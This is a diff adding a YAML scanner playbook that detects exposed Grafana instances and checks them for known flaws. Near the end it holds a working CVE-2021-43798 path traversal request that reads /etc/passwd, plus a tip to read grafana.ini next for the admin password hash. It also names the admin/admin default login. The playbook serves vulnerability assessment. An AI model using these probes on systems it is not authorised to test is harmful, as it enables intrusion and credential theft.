@@ -1,0 +1,89 @@
+id: grafana_default
+name: "Grafana exposed instance enumeration"
+description: |
+  Grafana defaults to admin/admin until the operator changes it.  Recent
+  high-impact CVEs: CVE-2021-43798 (path traversal), CVE-2024-1313
+  (snapshot auth bypass).
+severity_floor: MEDIUM
+tags: [observability, default-cred, exposed-service, grafana]
+mitre: [T1078, T1592]
+
+trigger:
+  services:
+    - ports: [3000, 3001]
+    - banner_contains: ["Grafana", "grafana"]
+  findings:
+    - title_contains: ["Grafana"]
+
+steps:
+  - name: grafana_login
+    tool: curl
+    args:
+      - "-s"
+      - "-I"
+      - "--max-time"
+      - "10"
+      - "{url}/login"
+    timeout: 15
+    success:
+      stdout_contains: ["Grafana"]
+    on_success:
+      finding:
+        title: "Grafana instance detected at {url}"
+        severity: INFO
+
+  - name: api_health
+    tool: curl
+    optional: true
+    args:
+      - "-s"
+      - "--max-time"
+      - "10"
+      - "{url}/api/health"
+    timeout: 15
+    success:
+      stdout_contains: ["version", "commit"]
+    on_success:
+      finding:
+        title: "Grafana version exposed via /api/health on {host}:{port}"
+        severity: LOW
+        description: "Version info readable anonymously. Match against CVE database for version-specific bugs (CVE-2021-43798 etc.)."
+
+  - name: snapshot_auth_bypass
+    tool: curl
+    optional: true
+    args:
+      - "-s"
+      - "--max-time"
+      - "10"
+      - "-o"
+      - "/dev/null"
+      - "-w"
+      - "%{http_code}"
+      - "{url}/api/snapshots"
+    timeout: 15
+    success:
+      stdout_contains: ["200", "401"]
+    on_failure:
+      finding:
+        title: "Grafana snapshots endpoint reachable on {host}:{port}"
+        severity: MEDIUM
+        description: "/api/snapshots returned a non-200/401 response. Probe for CVE-2024-1313 (snapshot auth bypass) manually."
+
+  - name: path_traversal_check
+    tool: curl
+    optional: true
+    args:
+      - "-s"
+      - "--max-time"
+      - "10"
+      - "{url}/public/plugins/welcome/../../../../../../../etc/passwd"
+    timeout: 15
+    success:
+      stdout_contains: ["root:x:"]
+    on_success:
+      finding:
+        title: "Grafana CVE-2021-43798 path traversal on {host}:{port}"
+        severity: CRITICAL
+        description: "Plugin path traversal reads /etc/passwd. Affects Grafana 8.0.0-8.3.0. Read /etc/grafana/grafana.ini next for the admin password hash."
+        cve: "CVE-2021-43798"
